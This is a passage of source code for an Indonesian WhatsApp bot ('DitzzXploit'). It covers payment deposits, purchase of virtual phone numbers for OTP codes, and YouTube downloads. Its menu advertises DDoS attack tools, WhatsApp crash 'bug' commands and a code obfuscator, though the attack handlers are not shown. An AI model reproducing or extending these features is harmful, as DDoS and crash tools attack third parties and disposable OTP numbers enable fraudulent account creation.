if (!isOwner) return reply(bvl)
        await DitzzXploit.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			DitzzXploit.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
DitzzXploit.sendMessage(from, {text:`\`\`\`JOIN GUYS 700 MEMBER MAU BERBAGI VPS AND ADMIN PANEL\`\`\`\n\n@${m.sender.split("@")[0]} https://s.id/PediaBotz`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}

async function obfus(query) {
return new Promise((resolve, reject) => {
try {
const obfuscationResult = jsobfus.obfuscate(query,
{
compact: false,
controlFlowFlattening: true,
controlFlowFlatteningThreshold: 1,
numbersToExpressions: true,
simplify: true, 
stringArrayShuffle: true,
splitStrings: true,
stringArrayThreshold: 1
}
);
const result = {
status: 200,
author: `Zans-Official`,
result: obfuscationResult.getObfuscatedCode()
}
resolve(result)
} catch (e) {
reject(e)
}
})
}

const downloadMp4 = async (Link) => {
let gHz = require("./scrape/savefrom")
let Lehd = await gHz.savefrom(Link)
let ghd = await reSize(Lehd.thumb, 300, 300)
let ghed = await ytdl.getInfo(Link)
let gdyr = await DitzzXploit.sendMessage(from, {image: { url: Lehd.thumb } , caption: `Channel Name : ${ghed.player_response.videoDetails.author}
Channel Link : https://youtube.com/channel/${ghed.player_response.videoDetails.channelId}
Title : ${Lehd.meta.title}
Duration : ${Lehd.meta.duration}
Desc : ${ghed.player_response.videoDetails.shortDescription}`}, { quoted : m })
try {
await ytdl.getInfo(Link)
let mp4File = getRandom('.mp4')
console.log(color('Download Video With ytdl-core'))
let nana = ytdl(Link)
.pipe(fs.createWriteStream(mp4File))
.on('finish', async () => {
await DitzzXploit.sendMessage(from, { video: fs.readFileSync(mp4File), caption: mess.succes, gifPlayback: false }, { quoted: gdyr })
fs.unlinkSync(`./${mp4File}`)
})
} catch (err) {
reply(`${err}`)
}
}

if (body === "payment_ovo") {
if (!fs.existsSync(depositPath + sender.split("@")[0] + ".json")) {
var deposit_object = {
ID: require("crypto").randomBytes(5).toString("hex").toUpperCase(),
session: "amount",
date: new Date().toLocaleDateString("ID", { timeZone: "Asia/Jakarta"}),
number: sender,
payment: "OVO",
data: {
amount_deposit: ""
}
}
fs.writeFileSync(depositPath + sender.split("@")[0] + ".json", JSON.stringify(deposit_object, null, 2))
reply("Oke kak mau deposit berapa?\n\nContoh: 15000")
} else {
reply("Proses Deposit kamu masih ada yang belum terselesaikan\n\nKetik Batal untuk membatalkan")
}
} else if (body === "payment_qris") {
if (!fs.existsSync(depositPath + sender.split("@")[0] + ".json")) {
var deposit_object = {
ID: require("crypto").randomBytes(5).toString("hex").toUpperCase(),
session: "amount",
date: new Date().toLocaleDateString("ID", { timeZone: "Asia/Jakarta"}),
number: sender,
payment: "QRIS",
data: {
amount_deposit: ""
}
}
fs.writeFileSync(depositPath + sender.split("@")[0] + ".json", JSON.stringify(deposit_object, null, 2))
reply("Oke kak mau deposit berapa?\n\nContoh: 15000")
} else {
reply("Proses Deposit kamu masih ada yang belum terselesaikan\n\nKetik Batal untuk membatalkan")
}
} else if (body === "payment_dana") {
if (!fs.existsSync(depositPath + sender.split("@")[0] + ".json")) {
var deposit_object = {
ID: require("crypto").randomBytes(5).toString("hex").toUpperCase(),
session: "amount",
date: new Date().toLocaleDateString("ID", { timeZone: "Asia/Jakarta"}),
number: sender,
payment: "DANA",
data: {
amount_deposit: ""
}
}
fs.writeFileSync(depositPath + sender.split("@")[0] + ".json", JSON.stringify(deposit_object, null, 2))
reply("Oke kak mau deposit berapa?\n\nContoh: 15000")
} else {
reply("Proses Deposit kamu masih ada yang belum terselesaikan\n\nKetik Batal untuk membatalkan")
}
}

if (fs.existsSync(depositPath + sender.split("@")[0] + ".json")) {
if (!m.key.fromMe) {
let data_deposit = JSON.parse(fs.readFileSync(depositPath + sender.split("@")[0] + ".json"))
if (data_deposit.session === "amount") {
if (isNaN(body)) return reply("Masukan hanya angka ya")
data_deposit.data.amount_deposit = Number(body);
if (data_deposit.data.amount_deposit < 1500) return reply(`Deposit Minimal Rp1.500`)
data_deposit.session = "konfirmasi_deposit";
fs.writeFileSync(depositPath + sender.split("@")[0] + ".json", JSON.stringify(data_deposit, null, 3));
reply(`「 𝙆𝙊𝙉𝙁𝙄𝙍𝙈𝘼𝙎𝙄-𝘿𝙀𝙋𝙊𝙎𝙄𝙏 」

▪ ID : ${data_deposit.ID}
▪ Nomer : ${data_deposit.number.split('@')[0]}
▪ Payment : ${data_deposit.payment}
▪ Jumlah Deposit : Rp${toRupiah(data_deposit.data.amount_deposit)}
▪ Pajak Admin : Rp1000
▪ Total Pembayaran : Rp${toRupiah(data_deposit.data.amount_deposit+1000)}

_Deposit akan dibatalkan otomatis apabila terdapat kesalahan input._

_Ketik Lanjut untuk melanjutkan_
_Ketik Batal untuk membatalkan_`)
} else if (data_deposit.session === "konfirmasi_deposit") {
if (body.toLowerCase() === "lanjut") {
if (data_deposit.payment === "OVO") {
var py_ovo=`༆━━[ *PAYMENT OVO* ]━━࿐
 
*Nomer :* ${payment.ovo.nomer}
*AN :* ${payment.ovo.atas_nama}

_Silahkan transfer dengan nomor yang sudah tertera, Jika sudah harap kirim bukti foto dengan caption #bukti untuk di acc oleh admin_`
reply(py_ovo)
} else if (data_deposit.payment === "QRIS") {
var qr_fexf =`༆━━[ *PAYMENT QRIS* ]━━࿐
 
*Url :* https://telegra.ph/file/7e1f0521e65c99289d9ea.jpg
*AN :* ARGA

_Silahkan transfer dengan nomor yang sudah tertera, Jika sudah harap kirim bukti foto dengan caption #bukti untuk di acc oleh admin_`
DitzzXploit.sendMessage(from, {image:{url: 'https://telegra.ph/file/7e1f0521e65c99289d9ea.jpg'}, caption:qr_fexf}, {quoted: hw})
} else if (data_deposit.payment === "DANA") {
var py_dana =`༆━━[ *PAYMENT DANA* ]━━࿐
 
*Nomer :* ${payment.dana.nomer}
*AN :* ${payment.dana.atas_nama}

_Silahkan transfer dengan nomor yang sudah tertera, Jika sudah harap kirim bukti foto dengan caption #bukti untuk di acc oleh admin_`
reply(py_dana)
}} else if (body.toLowerCase() === "batal") {
reply(`Baik kak, Deposit Dengan ID : ${data_deposit.ID} dibatalkan 😊`)
fs.unlinkSync(depositPath + sender.split('@')[0] + '.json')
}}}}

const downloadMp3 = async (Link) => {
let pNx = require("./scrape/savefrom")
let Puxa = await pNx.savefrom(Link)
let MlP = await reSize(Puxa.thumb, 300, 300)
let PlXz = await ytdl.getInfo(Link)
let gedeyeer = await DitzzXploit.sendMessage(from, { image: { url: Puxa.thumb } , caption: `Channel Name : ${PlXz.player_response.videoDetails.author}
Channel Link : https://youtube.com/channel/${PlXz.player_response.videoDetails.channelId}
Title : ${Puxa.meta.title}
Duration : ${Puxa.meta.duration}
Desc : ${PlXz.player_response.videoDetails.shortDescription}`}, { quoted : m })
try {
await ytdl.getInfo(Link)
let mp3File = getRandom('.mp3')
console.log(color('Download Audio With ytdl-core'))
ytdl(Link, { filter: 'audioonly' })
.pipe(fs.createWriteStream(mp3File))
.on('finish', async () => {
await DitzzXploit.sendMessage(from, { audio: fs.readFileSync(mp3File), mimetype: 'audio/mp4' }, { quoted: gedeyeer })
fs.unlinkSync(mp3File)
})
} catch (err) {
reply(`${err}`)
}
}

let cekUser = (satu, dua) => { 
let x1 = false
Object.keys(db_user).forEach((i) => {
if (db_user[i].id == dua){x1 = i}})
if (x1 !== false) {
if (satu == "id"){ return db_user[x1].id }
if (satu == "name"){ return db_user[x1].name }
if (satu == "seri"){ return db_user[x1].seri }
if (satu == "premium"){ return db_user[x1].premium }
}
if (x1 == false) { return null } 
}
let setUser = (satu, dua, tiga) => { 
Object.keys(db_user).forEach((i) => {
if (db_user[i].id == dua){
if (satu == "±id"){ db_user[i].id = tiga
fs.writeFileSync('./database/pengguna.json', JSON.stringify(db_user))} 
if (satu == "±name"){ db_user[i].name = tiga 
fs.writeFileSync('./database/pengguna.json', JSON.stringify(db_user))} 
if (satu == "±seri"){ db_user[i].seri = tiga 
fs.writeFileSync('./database/pengguna.json', JSON.stringify(db_user))} 
if (satu == "±premium"){ db_user[i].premium = tiga 
fs.writeFileSync('./database/pengguna.json', JSON.stringify(db_user))} 
}})
}

let teks_format =`*Berikut ini cara order kode otp*

_Example_
.order id

_Contoh_
.order 14

untuk melihat id layanan
silahkan ketik .layanan`

let teks_format2 = `Format Salah !!

_Example_
.getorder <order_id>

_Contoh_
.getorder 55778888
`

DitzzXploit.readMessages([m.key])

switch (command) {
case 'menu': {
let ditzzX = generateWAMessageFromContent(m.from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: "*CLICK Hare Blog*"
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: "Yt : DitzzXploit"
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: `👋Hallo Kak *${pushname}*

▭▬▭( * ஐ ListMenu ஐ* )▭▬▭
⭔${prefix}stopjadibot
⭔${prefix}listjadibot
⭔${prefix}jadibot
`,
            subtitle: `p`,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
                           {
                "name": "single_select",
                "buttonParamsJson": "{\"title\":\"Silakan Klick\",\"sections\":[{\"DitzzXploit\":\"title\",\"highlight_label\":\"mix\",\"rows\":[{\"header\":\"Tools Mix\",\"title\":\"Tools Ddos Mix\",\"description\":\"Tools Ddos Mix\",\"id\":\".ddos\"},{\"header\":\"Bypass-X\",\"title\":\"Tools Ddos Bypas\",\"description\":\"Tools Ddos Bypass-X\",\"id\":\".bypass\"}]}]}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": "{\"display_text\":\"buyNokos\",\"id\":\".otpkunokos\"}"
              },
 {
                "name": "quick_reply",
                "buttonParamsJson": "{\"display_text\":\"TopUp Saldo Otomatis (buat buy nokos)\",\"id\":\".deposit\"}"
              },
 {
                "name": "quick_reply",
                "buttonParamsJson": "{\"display_text\":\"Cek Status Taransaksi\",\"id\":\". getotpkustatus\"}"
              },
 {
                "name": "quick_reply",
                "buttonParamsJson": "{\"display_text\":\"List Negara Yang Tersedia\",\"id\":\".negara\"}"
              },
 {
                "name": "quick_reply",
                "buttonParamsJson": "{\"display_text\":\"Batalkan Transaksi\",\"id\":\".censel\"}"
              },
 {
                "name": "quick_reply",
                "buttonParamsJson": "{\"display_text\":\"Send Sms Otp\",\"id\":\".sendsms\"}"
              },
 {
                "name": "quick_reply",
                "buttonParamsJson": "{\"display_text\":\"Resend (Kirim Ulang kode Sms)\",\"id\":\".resend\"}"
              },
 {
                "name": "quick_reply",
                "buttonParamsJson": "{\"display_text\":\"Qris\",\"id\":\"payment_qris\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": "{\"display_text\":\"dana\",\"id\":\"dana\"}"
              },
                            {
                "name": "quick_reply",
                "buttonParamsJson": "{\"display_text\":\"Get Service Otpku\",\"id\":\".getserviceotpku\"}"
              },
                                          {
                "name": "quick_reply",
                "buttonParamsJson": "{\"display_text\":\"Ddos Attack\",\"id\":\".ddos\"}"
              },
                            {
                "name": "quick_reply",
                "buttonParamsJson": "{\"display_text\":\"Cek Apk otp ku\",\"id\":\".cekapk\"}"
              },
                            {
                "name": "quick_reply",
                "buttonParamsJson": "{\"display_text\":\"🤡AllMenu🤡\",\"id\":\".allmenu\"}"
              },
                            {
                "name": "quick_reply",
                "buttonParamsJson": "{\"display_text\":\"bug1\",\"id\":\".kontolbug\"}"
              },
                            {
                "name": "quick_reply",
                "buttonParamsJson": "{\"display_text\":\"bug2\",\"id\":\".sepuhcrash\"}"
              },
                            {
                "name": "quick_reply",
                "buttonParamsJson": "{\"display_text\":\"verify\",\"id\":\".verify\"}"
              },
                            {
                "name": "quick_reply",
                "buttonParamsJson": "{\"display_text\":\"verify2\",\"id\":\".verify2\"}"
              },
                            {
                "name": "quick_reply",
                "buttonParamsJson": "{\"display_text\":\"accdeposit\",\"id\":\".accdepo\"}"
              },
                            {
                "name": "quick_reply",
                "buttonParamsJson": "{\"display_text\":\"buktitf2\",\"id\":\".buktitf2\"}"
              },
                            {
                "name": "quick_reply",
                "buttonParamsJson": "{\"display_text\":\"saldo\",\"id\":\".saldo2\"}"
              },
                            {
                "name": "quick_reply",
                "buttonParamsJson": "{\"display_text\":\"RejectDeposit\",\"id\":\".rejectdepo\"}"
              },
                            {
                "name": "quick_reply",
                "buttonParamsJson": "{\"display_text\":\"Bugmenu Begars 🚯\",\"id\":\".bugmenu\"}"
              },
                            {
                "name": "quick_reply",
                "buttonParamsJson": "{\"display_text\":\"panel (button)\",\"id\":\".panel\"}"
              },
                                          {
                "name": "quick_reply",
                "buttonParamsJson": "{\"display_text\":\"domainmenu 🤡\",\"id\":\".domainmenu\"}"
              },
                            {
                "name": "quick_reply",
                "buttonParamsJson": "{\"display_text\":\"chanel\",\"id\":\".chanel\"}"
              },
                                          {
                "name": "quick_reply",
                "buttonParamsJson": "{\"display_text\":\"Addgc\",\"id\":\".addgc\"}"
              },
                                          {
                "name": "quick_reply",
                "buttonParamsJson": "{\"display_text\":\"Owner 🥱🥱😻\",\"id\":\".owner\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": "{\"display_text\":\"Smm Menu\",\"id\":\".smm\"}"
              },
               {
 "name": "cta_url",
 "buttonParamsJson": "{\"display_text\":\"Info Update Sc KrocoBot\",\"url\":\"https://whatsapp.com/channel/0029VaZPLAJ9xVJdf7A73036\",\"merchant_url\":\"https://whatsapp.com/channel/0029VaZPLAJ9xVJdf7A73036\"}"
 },
           ],
          })
        })
    }
  }
}, {})

return DitzzXploit.relayMessage(m.key.remoteJid, ditzzX.message, {
  messageId: m.key.id
})
} ditzzX = fs.readFileSync('./sticker_reply/private.webp')
DitzzXploit.sendMessage(from, { sticker: ditzzX }, { quoted: hw })
        break
case 'deposit': case 'depo':{
reply(`╭━━━━━━━━━━━━━━━┅•ิ.•ஐ
│ *${hariini}
┌┤ 𝖴𝗇𝗍𝗎𝗄 𝗆𝖾𝗅𝖺𝗄𝗎𝗄𝖺𝗇 𝖽𝖾𝗉𝗈𝗌𝗂𝗍, 
││𝗌𝗂𝗅𝖺𝗁𝗄𝖺𝗇 𝗉𝗂𝗅𝗂𝗁 𝗉𝖺𝗒𝗆ent 𝗒𝖺𝗇𝗀 
││𝗍𝖾𝗋𝗌𝖾𝖽𝗂𝖺.
││𝖲𝗂𝗅𝖺𝗁𝗄𝖺𝗇 𝗄𝖾𝗍𝗂𝗄 𝗌𝖾𝗌𝗎𝖺𝗂 𝗉𝖺𝗒𝗆𝖾𝗇𝗍
││ 𝗒𝖺𝗇𝗀 𝖽𝗂 𝗂𝗇𝗀𝗂𝗇𝗄𝖺𝗇.
││
││Untuk pengguna 
││Gopay, ovo, shopee pay, bank,
││silahkan untuk menggunakan
││ payment_qris
││
│└────────────┾•ิ_•┽
╰━━━━━━━━━━━━━━━━┅•ิ.•ஐ`)
}
break
case "smm":{
let smm = `╭━━━━━━━━━━━━━━━┅•ิ.•ஐ
│ *${hariini}
┌┤ Untuk Suntik Sosmed Silahkan Ketik cmd di bawah
││━━━━━━━━━━━━━━┅•ิ.•ஐ
││.suntiksmm - untuk order suntik sosmed
││.profil-smm - untuk mengecek profil/akun smm owner
││.ceksaldo-smm - untuk mengecek saldo smm
││.deposit-smm - untuk deposit smm
││.smm-list - untuk menampilkan smm list (layanan)
││.cektrx - untuk mengecek status transaksi
││
│└────────────┾•ิ_•┽
╰━━━━━━━━━━━━━━━━┅•ิ.•ஐ`
reply(smm)
}
break
case "jadibot":{
if (cekUser("id", sender) == null) return DitzzXploit.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
jadibot(DitzzXploit, sender)
}
break
case "listjadibot":{
if (cekUser("id", sender) == null) return DitzzXploit.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
listjadibot(DitzzXploit, m)
}
break
case "stopjadibot":{
if (cekUser("id", sender) == null) return DitzzXploit.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
stopjadibot(DitzzXploit, sender)
}
break
case 'saldo':{
reply(`*━━ CHECK YOUR INFO ━━*

 _• *Name:* ${cekUser("name", sender)}_
 _• *Resi:* ${cekUser("resi", sender)}_
 _• *Nomer:* ${sender.split('@')[0]}_
 _• *Saldo:* Rp${toRupiah(cekSaldo(sender, db_saldo))}_

Untuk menbahkan Saldo ketik #deposit

*Note :*
_saldo hanya bisa untuk buy nokos_
_tidak bisa ditarik atau transfer_!`)
}
break
case 'daftar':{
    if (cekUser("id", sender) !== null) return reply('Kamu sudah terdaftar !!')
var res_usi = `${makeid(10)}`
var user_namess = `#Kroco${makeid(5)}`
let object_user = {"id": sender, "name": user_namess, "seri": res_usi, "premium": false }
db_user.push(object_user)
fs.writeFileSync('./freya/user.json', JSON.stringify(db_user, 2, null))
reply(`Sukses, Anda Sekarang Sudah Terdaftar✅ @${sender.split("@")[0]}`, [sender])
var verify_teks =`───「 𝗧𝗘𝗥𝗩𝗘𝗥𝗜𝗙𝗜𝗞𝗔𝗦𝗜 」────

○ ID : @${sender.split('@')[0]}
○ Name : ${user_namess}
○ Seri : ${res_usi}

silahkan ketik .menu
bila tidak bisa mohon
maaf, sc nya private🙏
`
DitzzXploit.sendMessage(from, {text : verify_teks}, {quoted: hw})
}
break
case 'bukti':
if (!fs.existsSync(depositPath + sender.split("@")[0] + ".json")) return reply(`Maaf *${cekUser("name", sender)}* sepertinya kamu belum pernah melakukan deposit`)
if (isImage && isQuotedImage) return reply(`Kirim gambar dengan caption *#bukti* atau reply gambar yang sudah dikirim dengan caption *#bukti*`)
await DitzzXploit.downloadAndSaveMediaMessage(msg, "image", `./all/database/deposit/${sender.split('@')[0]}.jpg`)

let oke_bang = fs.readFileSync(`./all/database/deposit/${sender.split('@')[0]}.jpg`)
let data_depo = JSON.parse(fs.readFileSync(depositPath + sender.split("@")[0] + ".json"))

let caption_bukti =`「 *DEPOSIT USER* 」
⭔ID: ${data_depo.ID}
⭔Nomer: @${data_depo.number.split('@')[0]}
⭔Payment: ${data_depo.payment}
⭔Tanggal: ${data_depo.date.split(' ')[0]}
⭔Jumlah Deposit: Rp ${toRupiah(data_depo.data.amount_deposit)}
⭔Pajak Admin : Rp 1000
⭔Total Pembayaran : Rp ${toRupiah(data_depo.data.amount_deposit+1000)}

Ada yang deposit nih kak, coba dicek saldonya, jika sudah masuk konfirmasi

Jika sudah masuk konfirmasi dengan cara klik *#accdepo*
Jika belum masuk batalkan dengan cara ketik *#rejectdepo*`

let bukti_bayar = {
image: oke_bang,
caption: caption_bukti,
mentions: [data_depo.number],
title: 'Bukti pembayaran',
footer: 'Press The Button Below',
headerType: 5 
}
DitzzXploit.sendMessage(`${global.ownerNumber}`, bukti_bayar)
reply(`Mohon tunggu ya kak, sampai di Konfirmasi oleh owner ☺`)
fs.unlinkSync(`./all/database/deposit/${sender.split('@')[0]}.jpg`)
break
case 'accdepo':{
if (!isOwner) return reply(mess.OnlyOwner)
if (!q) return reply(`Contoh: ${prefix+command} 628xxx`)
let orang = q.split(",")[0].replace(/[^0-9]/g, '')
let data_deposit = JSON.parse(fs.readFileSync(depositPath + orang + '.json'))
addSaldo(data_deposit.number, Number(data_deposit.data.amount_deposit), db_saldo)
var text_sukses = `「 *DEPOSIT SUKSES* 」
⭔ID : ${data_deposit.ID}
⭔Name ${cekUser("name", sender)}
⭔Nomer: ${data_deposit.number.split('@')[0]}
⭔Payment: ${data_deposit.payment}
⭔Tanggal: ${data_deposit.date.split(' ')[0]}
⭔Jumlah Deposit: Rp${toRupiah(data_deposit.data.amount_deposit)}`
reply(`${text_sukses}\n`)
DitzzXploit.sendMessage(data_deposit.number, { text: `${text_sukses}\n\n_Deposit kamu telah dikonfirmasi oleh admin, silahkan cek saldo dengan cara ketik #saldo_`})
fs.unlinkSync(depositPath + data_deposit.number.split('@')[0] + ".json")
}
break
case 'rejectdepo':{
if (!isOwner) return reply(mess.OnlyOwner)
if (!q) return reply(`Contoh: ${prefix+command} 628xxx`)
let orang = q.split(",")[0].replace(/[^0-9]/g, '')
let data_deposit = JSON.parse(fs.readFileSync(depositPath + orang + '.json'))
reply(`Sukses Reject ID Deposit : ${data_deposit.ID}`)
DitzzXploit.sendMessage(data_deposit.number, { text: `Maaf Deposit Dengan ID : *${data_deposit.ID}* Ditolak, Jika ada kendala hubungin Owner Bot.\nwa.me/${global.ownerNumber}`})
fs.unlinkSync(depositPath + data_deposit.number.split('@')[0] + ".json")
}
break
case 'otpkunokos': {
		if (isGroup) return reply(mess.OnlyPM)
		if (cekUser("id", sender) == null) return DitzzXploit.sendMessage(from, { text: mess.OnlyUser, mentions: [global.ownerNumber, sender]}, { quoted: fkontak })
		if (cekSaldo(sender, db_saldo) == 0) return reply(`Yahh Saldo Kamu Kurang nih kak Untuk Membeli Nokos\n\nSilahkan Ketik *#deposit* Untuk Menambah-kan Saldo Anda😊`)
  if (!q) return reply(`Masukan Id service\nUntuk mengecek service id, bisa ketik #getservice`)
	var cekhar = await fetchJson('https://otpku.com/api/json.php?api_key=' + apikeyOtpKu + '&action=services&country=')
  let x = false
  Object.keys(cekhar.data).forEach((i) => {
    if (cekhar.data[i].id == q){x = i}
  })
  const pricee = cekhar.data[x].price
  if (cekSaldo(sender, db_saldo) < pricee && cekSaldo(sender, db_saldo) !== 0) return reply(`Yahh Saldo Kamu Kurang nih kak Untuk Membeli nokos dengan harga Rp${pricee}\n\nSilahkan Ketik *#deposit* Untuk Menambah-kan Saldo Anda😊`)
const axios = require("axios");
  const config = {
    method: 'POST',
    url: 'https://otpku.com/api/json.php?api_key=' + apikeyOtpKu + '&action=order&service=' + q + '&operator=any'
    }
axios(config)
    .then(function (response) {
    	if (response.data.status == false) return reply(JSON.stringify(response.data.data.msg, null, '\t'));
    if (response.data.status == true) {
reply(`───「  *CREATE NUMBER*  」────
    
    *ID:* ${response.data.data.id}
    *NUMBER:* ${response.data.data.number}
    *OPERATOR:* ${response.data.data.operator}
    *SERVICE ID:* ${response.data.data.service_id}
    *SERVICE NAME:* ${response.data.data.service_name}
    *HARGA:* Rp ${pricee}
    
 !Nomor di atas Terblokir? atau Terlena masalah? silahkan Ketik #cansel
    
ℹ️Untuk Mengecek SmS bisa Ketik #getstatus ${response.data.data.id}
ℹ️Untuk jikalau sms blom masuk atau tidak berfungsi, bisa ketik #resend ${response.data.data.id}`)
    DitzzXploit.sendMessage(`${global.ownerNumber}`, {text: `───「  *ORDERAN*  」────
    
    *ID:* ${response.data.data.id}
    *NUMBER:* ${response.data.data.number}
    *OPERATOR:* ${response.data.data.operator}
    *SERVICE ID:* ${response.data.data.service_id}
    *SERVICE NAME:* ${response.data.data.service_name}
    *HARGA:* Rp ${pricee}`}, {quoted: msg})
    minSaldo(sender, Number(pricee), db_saldo)
if (cekUser("premium", from) == true) return 
setUser("±premium", from, true)
   }
  })
  .catch(function (error) {
      // Penanganan kesalahan jika ada
      console.error('Error:', error);
      reply(JSON.stringify(error, null, '\t'));
    });
}
  break
  case 'getotpkustatus': {
  	if (isGroup) return reply(mess.OnlyPM)
  	if (cekUser("id", sender) == null) return DitzzXploit.sendMessage(from, { text: mess.OnlyUser, mentions: [global.ownerNumber, sender]}, { quoted: fkontak })
  if (cekUser("premium", sender) == false) return reply(mess.OnlyPrem)
  if (!q) return reply(`Masukan Id pesanan anda\nLIHAT ID PESANAN, BISA CEK TEXT CREATE NUMBER`)
const axios = require("axios");
 const config = {
    method: 'GET',
    url: 'https://otpku.com/api/json.php?api_key=' + apikeyOtpKu + '&action=status&id=' + q
    }
axios(config)
    .then(function (response) {
    	if (response.data.status == false) return reply(JSON.stringify(response.data.data.msg, null, '\t'));
    if (response.data.status == true) {
reply(`───「  *STATUS*  」────
    
    *ID:* ${response.data.data.id}
    *NUMBER:* ${response.data.data.number}
    *STATUS:* ${response.data.data.status}
    *SMS:* ${response.data.data.sms}
    *SERVICE NAME:* ${response.data.data.service_name}

ℹ️Jikalau sudah 5menit lebih, otp/sms belum.masuk, Silahkan cansel produk, dengan ketik #cansel`)
    }
  })
  .catch(function (error) {
      // Penanganan kesalahan jika ada
      console.error('Error:', error);
      reply(JSON.stringify(error, null, '\t'));
    });
}
  break
  case 'cansel': {
  if (isGroup) return reply(mess.OnlyPM)
  	if (cekUser("id", sender) == null) return DitzzXploit.sendMessage(from, { text: mess.OnlyUser, mentions: [global.ownerNumber, sender]}, { quoted: fkontak })
  if (!q) return reply(`Masukan Id pesanan anda\n_ℹ️LIHAT ID PESANAN, BISA CEK TEXT CREATE NUMBER_`)
var cekser = await fetchJson('https://otpku.com/api/json.php?api_key=' + apikeyOtpKu + '&action=services&country=')
const axios = require("axios");
  const config = {
    method: 'GET',
    url: 'https://otpku.com/api/json.php?api_key=' + apikeyOtpKu + '&action=set_status&id=' + q + '&status=2'
    }
axios(config)
    .then(function (response) {
    	if (response.data.status == false) return reply(`───「  *CANSEL STATUS*  」────

    *PESAN:* ${response.data.msg}
    *ID:* ${response.data.data.id}
    *SERVICE NAME:* ${response.data.data.service_name}`)
    if (response.data.status == true) {
    DitzzXploit.sendMessage(from, {text: `───「  *CANSEL STATUS*  」────

    *PESAN:* ${response.data.msg}
    *ID:* ${response.data.data.id}
    *SERVICE NAME:* ${response.data.data.service_name}

Mohon Kembalikan Saldo user dengan #addsaldo
Untuk cek Harga layanan yang di cansel, bisa Cek pesan Create number sebelumnya`}, {quoted: msg})
  let x = false
  Object.keys(cekser.data).forEach((i) => {
    if (cekser.data[i].name == response.data.data.service_name){x = i}
  })
  const priceee = cekser.data[x].price
  addSaldo(sender, Number(priceee), db_saldo)
    }
  })
  .catch(function (error) {
      // Penanganan kesalahan jika ada
      console.error('Error:', error);
      reply(JSON.stringify(error, null, '\t'));
    });
}
  break
  case 'sendsmsotpku': {
  	if (isGroup) return reply(mess.OnlyPM)
  	if (cekUser("id", sender) == null) return DitzzXploit.sendMessage(from, { text: mess.OnlyUser, mentions: [global.ownerNumber, sender]}, { quoted: fkontak })
  if (cekUser("premium", sender) == false) return reply(mess.OnlyPrem)
  if (!q) return reply(`Masukan Id pesanan anda\nLIHAT ID PESANAN, BISA CEK TEXT CREATE NUMBER`)
const axios = require("axios");
  const config = {
    method: 'GET',
    url: 'https://otpku.com/api/json.php?api_key=' + apikeyOtpKu + '&action=set_status&id=' + q + '&status=1'
    }
axios(config)
    .then(function (response) {
    	if (response.data.status == false) return reply(`───「  *SMS STATUS*  」────

    *PESAN:* ${response.data.msg}
    *ID:* ${response.data.data.id}
    *SERVICE NAME:* ${response.data.data.service_name}

Silahkan ketik #resend Untuk mengirim ulang sms`)
    if (response.data.status == true) {
reply(`───「  *SMS STATUS*  」────

    *PESAN:* ${response.data.msg}
    *ID:* ${response.data.data.id}
    *SERVICE NAME:* ${response.data.data.service_name}

_Silahkan gunakan kata command #getstatus untuk mengecek sms, Jikalau sms masih blom bisa, silahkan ketik #resend_`)
    }
  })
  .catch(function (error) {
      // Penanganan kesalahan jika ada
      console.error('Error:', error);
      reply(JSON.stringify(error, null, '\t'));
    });
}
  break
  case 'resend': {
  	if (isGroup) return reply(mess.OnlyPM)
  	if (cekUser("id", sender) == null) return DitzzXploit.sendMessage(from, { text: mess.OnlyUser, mentions: [global.ownerNumber, sender]}, { quoted: fkontak })
  if (cekUser("premium", sender) == false) return reply(mess.OnlyPrem)
  if (!q) return reply(`Masukan Id pesanan anda\nLIHAT ID PESANAN, BISA CEK TEXT CREATE NUMBER`)
const axios = require("axios");
      const config = {
    method: 'GET',
    url: 'https://otpku.com/api/json.php?api_key=' + apikeyOtpKu + '&action=set_status&id=' + q + '&status=3'
    }
axios(config)
    .then(function (response) {
    	if (response.data.status == false) return reply(`───「  *MENGUBAH SMS OTP*  」────

    *PESAN:* ${response.data.msg}
    *ID:* ${response.data.data.id}
    *SERVICE NAME:* ${response.data.data.service_name}

Silahkan tunggu beberapa saat, dan coba lagi`)
    if (response.data.status == true) {
reply(`───「  *MENGUBAH SMS OTP*  」────

    *PESAN:* ${response.data.msg}
    *ID:* ${response.data.data.id}
    *SERVICE NAME:* ${response.data.data.service_name}

Silahkan ketik #getstatus untuk cek sms otp`)
    }
  })
  .catch(function (error) {
      // Penanganan kesalahan jika ada
      console.error('Error:', error);
      reply(JSON.stringify(error, null, '\t'));
    });
}
  break

  case 'getserviceotpku': {
	if (isGroup) return reply(mess.OnlyPM)
  	if (cekUser("id", sender) == null) return DitzzXploit.sendMessage(from, { text: mess.OnlyUser, mentions: [global.ownerNumber, sender]}, { quoted: fkontak })
	if (!q) return reply(`Masukan nama negara nya\nDengan contoh: #${command} indo\n\n_Untuk mengcek negara yang tersedia bisa ketik #negara`)
  const config = await fetchJson('https://otpku.com/api/json.php?api_key=' + apikeyOtpKu + '&action=services&country=' + q)
  let teks = `*🍁BERIKUT LIST SERVICE YG TERSEDIA*\n\n`
  try {
